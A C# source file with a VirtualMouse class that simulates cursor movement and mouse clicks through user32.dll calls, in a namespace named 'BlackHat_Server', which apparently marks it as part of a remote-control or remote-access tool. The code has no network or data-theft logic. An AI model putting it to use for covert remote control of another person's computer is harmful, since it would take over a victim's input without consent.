using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace BlackHat_Server
{
    public class VirtualMouse
    {

        [DllImport("user32.dll")]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);

        public const int MOUSEEVENTF_LEFTDOWN = 0x02;
        public const int MOUSEEVENTF_LEFTUP = 0x04;
        public const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        public const int MOUSEEVENTF_RIGHTUP = 0x10;



        public void MouseClick(int x, int y)
        {
            SetCursorPos(x, y);

            int X = Control.MousePosition.X;
            int Y = Control.MousePosition.Y;

            mouse_event(MOUSEEVENTF_LEFTDOWN, X, Y, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
        }


        public void MouseRightClick(int x, int y)
        {
            SetCursorPos(x, y);

            int X = Control.MousePosition.X;
            int Y = Control.MousePosition.Y;

            mouse_event(MOUSEEVENTF_RIGHTDOWN, X, Y, 0, 0);
            mouse_event(MOUSEEVENTF_RIGHTUP, X, Y, 0, 0);
        }


        public void MouseDoubleCkick(int x, int y)
        {
            SetCursorPos(x, y);

            int X = Control.MousePosition.X;
            int Y = Control.MousePosition.Y;

            mouse_event(MOUSEEVENTF_LEFTDOWN, X, Y, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTDOWN, X, Y, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
        }

        public void MoveMouse(int x, int y)
        {
            SetCursorPos(x, y);
        }

            
    }
}
